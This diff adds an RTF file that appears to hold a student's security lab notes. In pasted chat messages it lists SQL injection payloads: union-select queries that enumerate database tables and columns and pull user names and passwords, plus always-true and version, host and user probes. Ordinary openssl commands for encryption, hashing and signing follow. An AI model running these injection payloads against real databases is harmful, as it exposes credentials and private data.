@@ -1,0 +1,71 @@
+{\rtf1\ansi\ansicpg1252\cocoartf2706
+\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;\f1\froman\fcharset0 TimesNewRomanPS-ItalicMT;\f2\froman\fcharset0 Times-Roman;
+\f3\froman\fcharset0 TimesNewRomanPSMT;}
+{\colortbl;\red255\green255\blue255;\red0\green0\blue0;}
+{\*\expandedcolortbl;;\csgenericrgb\c0\c0\c0;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww11520\viewh8400\viewkind0
+\deftab720
+\pard\pardeftab720\pardirnatural\partightenfactor0
+
+\f0\fs24 \cf0 np.set_printoptions(threshold=np.inf, linewidth=np.nan)\
+\
+[10:54 am, 14/11/2022] Babu: test' and 1=0 union select null, table_name from information_schema.tables #\
+[10:54 am, 14/11/2022] Babu: test' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #\
+[10:54 am, 14/11/2022] Babu: test' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #\
+[10:54 am, 14/11/2022] Babu: test' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #\
+[10:54 am, 14/11/2022] Babu: 1.	Always True Injection\
+test' OR 1=1#\
+[10:54 am, 14/11/2022] Babu: 2.	Display RDBMS and Version\
+test'union select null, version()#\
+[10:54 am, 14/11/2022] Babu: 3.	Display the hostname of our web app\
+' union select null, @@hostname#\
+[10:54 am, 14/11/2022] Babu: 4.	Display database user\
+test' union select null, user() #\
+[10:54 am, 14/11/2022] Babu: 5.	Display the Database Name\
+test' union select null, database() #\
+\
+\
+\pard\pardeftab720\li378\pardirnatural\partightenfactor0
+
+\f1\i\fs29 \cf2 \expnd0\expndtw0\kerning0
+openssl aes-128-cbc -e\'a0 -in plain.txt -out cipher.bin -k "password" -nosalt
+\f0\i0 \
+\
+
+\f1\i openssl aes-128-cbc -d\'a0 -in cipher1.bin -out pt.txt -k "password" \'96nosalt
+\f0\i0 \
+\pard\pardeftab720\pardirnatural\partightenfactor0
+
+\f1\i \cf2 openssl genrsa \'96out pvtkey.pem
+\f2\i0\fs24  \
+\pard\pardeftab720\li378\pardirnatural\partightenfactor0
+
+\f1\i\fs29 \cf2 openssl rsa -pubout -in pvtkey.pem -out pubkey.pem\'a0 
+\f3\i0 - generation of public key
+\f0 \
+\
+
+\f1\i openssl rsa -text -in pvtkey.pem
+\f0\i0 \
+
+\f1\i openssl rsautl -encrypt -in plain.txt -pubin -inkey pubkey.pem -out c1.bin
+\f0\i0 \
+
+\f1\i openssl rsautl -decrypt -in c1.bin\'a0 -inkey pvtkey.pem -out dec1.txt
+\f0\i0 \
+\pard\pardeftab720\li378\fi480\pardirnatural\partightenfactor0
+
+\f1\i \cf2 openssl md5 plain.txt
+\f0\i0 \
+\
+\pard\pardeftab720\li378\pardirnatural\qj\partightenfactor0
+
+\f1\i \cf2 openssl SHA256 plain.txt
+\f0\i0 \
+
+\f1\i openssl dgst -sha1 -sign pvtkey.pem -out s.bin plain.txt
+\f0\i0 \
+
+\f1\i openssl dgst -sha1 -verify pubkey.pem -signature s.bin plain.txt
+\f0\i0 \
+}
